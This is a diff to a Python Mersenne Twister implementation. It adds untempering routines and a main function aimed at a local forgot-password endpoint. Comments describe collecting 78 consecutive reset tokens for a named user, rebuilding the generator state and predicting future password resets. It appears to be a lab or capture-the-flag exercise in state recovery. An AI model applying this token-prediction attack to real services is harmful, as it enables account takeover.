@@ -81,8 +81,7 @@ class MerTwist:
 
         for i in range(1, self.n):
             self.MT[i] = (self.f * (self.MT[i-1] ^ (self.MT[i-1] >> (self.w-2))) + i) & 0xFFFFFFFF #lowest w bits of (f * (MT[i-1] xor (MT[i-1] >> (w-2))) + i)
-
-
+    # mt ^ mt >> w+2 - i / f  & 
 
     # Extract a tempered value based on MT[index]
     # calling twist() every n numbers
@@ -112,8 +111,10 @@ class MerTwist:
                 xA = xA ^ self.a
             self.MT[i] = self.MT[(i + self.m) % self.n] ^ xA
         self.index = 0
+# 
 
 
+    # convert to ints
     def unmix(self, token):
         # request 78 consecutive password reset tokens from eortiz
         # recreate initial state of generator and predict all future password resets
@@ -132,23 +133,15 @@ class MerTwist:
             result = val ^ result >> shift
         return result
     
+    
     def undoLeftShift(self, val, shift, mask):
         result = val
         for _ in range(32):
-            result = val ^ (result >> shift & mask)
+            result = val ^ (result << shift & mask)
         return result
 
 
     def unmix2(self, token):
-        # def twist(self):
-        # for i in range(self.n):
-        #     x = (self.MT[i] & self.upper_mask) + (self.MT[(i+1) % self.n] & self.lower_mask)
-        #     xA = x >> 1
-        #     if (( x % 2) != 0):
-        #         xA = xA ^ self.a
-        #     self.MT[i] = self.MT[(i + self.m) % self.n] ^ xA
-        # self.index = 0
-
         # y = self.MT[self.index]
         # y = y ^ ((y >> self.u) & self.d) = y3
         # y = y ^ ((y << self.s) & self.b) = y6
@@ -216,13 +209,13 @@ def breakMT():
 
 def main():
     # mt = MerTwist(0)
-
     # for i in range(10):
     #     print(mt.extract_number())
-
     # print(oracle())
-
     # breakMT()
+
+
+    # 127701 instead of localhost
     url = 'http://localhost:8080/forgot'
     tokens = []
     mt = MerTwist(1)
